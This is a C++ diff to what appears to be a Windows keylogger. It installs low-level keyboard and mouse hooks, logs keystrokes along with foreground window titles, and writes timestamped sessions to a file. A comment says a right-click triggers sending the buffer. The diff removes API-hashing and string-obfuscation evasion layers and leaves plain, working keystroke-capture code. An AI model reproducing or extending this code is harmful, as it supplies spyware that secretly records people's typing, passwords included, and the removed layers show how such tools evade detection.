@@ -8,12 +8,11 @@
 #include <string>
 #include <sstream>
 #include <fstream>
+#include <iostream>
 #include <vector>
 #include <map>
 #include <chrono>
 #include <iomanip>
-#include "APIHashing.h"
-#include "StringObfuscation.h"
 
 using namespace std;
 
@@ -131,10 +130,8 @@ private:
     // Retrieve foreground window title and process name
     static wstring GetActiveWindowTitle()
     {
-        // Resolve GetForegroundWindow via API hashing
-        typedef HWND(WINAPI * pGetForegroundWindow)(VOID);
-        auto fnGetWindow = (pGetForegroundWindow)APIResolver::ResolveAPI(APIHash::GetForegroundWindow);
-        HWND hwnd = fnGetWindow ? fnGetWindow() : NULL;
+        // Get foreground window handle
+        HWND hwnd = GetForegroundWindow();
         if (hwnd == NULL)
             return L"[Unknown Window]";
 
@@ -212,9 +209,7 @@ private:
             // Capture current keyboard state for accurate key interpretation
             BYTE keyboardState[256];
             if (!GetKeyboardState(keyboardState)) {
-                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
-                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
-                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+                return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
             }
 
             wchar_t unicodeBuffer[5] = {0};
@@ -222,10 +217,9 @@ private:
             // Convert virtual key to Unicode using current keyboard layout
             HWND hwnd = GetForegroundWindow();
             DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
-            HKL keyboardLayout = GetKeyboardLayout(threadId);            // Flag 0 handles dead keys and AltGr combinations
+            HKL keyboardLayout = GetKeyboardLayout(threadId);
+            // Flag 0 handles dead keys and AltGr combinations
             int result = ToUnicodeEx(vkCode, pKb->scanCode, keyboardState, unicodeBuffer, 4, 0, keyboardLayout);
-            
-            wcout << L"[ToUnicodeEx] result=" << result << L" buffer=[" << unicodeBuffer << L"]" << endl;
 
             wstring keyName;
             if (result > 0)
@@ -247,9 +241,7 @@ private:
                 vkCode == VK_CAPITAL)
             {
                 // Laisser passer à CallNextHookEx mais ne pas ajouter au buffer
-                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
-                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
-                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+                return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
             }
 
             // Handle backspace to remove last character from buffer
@@ -281,9 +273,7 @@ private:
                 ReleaseMutex(g_hMutex);
                 
                 // Do not continue - backspace is not added to the buffer
-                typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
-                auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
-                return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+                return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
             }
 
             if (!keyName.empty())
@@ -351,9 +341,7 @@ private:
             }
         }
 
-        typedef LRESULT(WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
-        auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
-        return fnCallNext ? fnCallNext(g_hKeyHook, nCode, wParam, lParam) : CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+        return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
     }
 
     // Low-level mouse hook callback (right-click triggers buffer send)
@@ -394,9 +382,7 @@ private:
             ReleaseMutex(g_hMutex);
         }
 
-        typedef LRESULT(WINAPI * pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
-        auto fnCallNext = (pCallNextHookEx)APIResolver::ResolveAPI(APIHash::CallNextHookEx);
-        return fnCallNext ? fnCallNext(g_hMouseHook, nCode, wParam, lParam) : CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
+        return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
     }
 
 public:
@@ -440,7 +426,7 @@ public:
 
             wstringstream header;
             header << L"========================================\n"
-                   << OBFUSCATE_W(L"Session Started") << L"\n"
+                   << L"Session Started\n"
                    << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                    << L"========================================\n";
             WriteToFile(header.str());
@@ -536,7 +522,7 @@ public:
 
             wstringstream footer;
             footer << L"\n========================================\n"
-                   << OBFUSCATE_W(L"Session Ended") << L"\n"
+                   << L"Session Ended\n"
                    << L"Date: " << put_time(&localTime, L"%Y-%m-%d %H:%M:%S") << L"\n"
                    << L"========================================\n\n";
             WriteToFile(footer.str());
